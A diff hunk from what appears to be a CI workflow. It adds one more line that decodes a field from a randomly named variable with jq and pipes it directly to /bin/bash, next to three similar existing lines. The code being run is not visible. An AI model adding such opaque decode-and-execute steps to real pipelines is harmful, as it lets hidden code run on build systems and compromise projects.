@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$ey05819" | jq -r .t10393 | /bin/bash
           printf '%s' "$nw556" | jq -r .ta2784 | /bin/bash
           printf '%s' "$irrg9" | jq -r .mbqy6464 | /bin/bash
+          echo $pwfa78772 | jq -r .ofice71 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
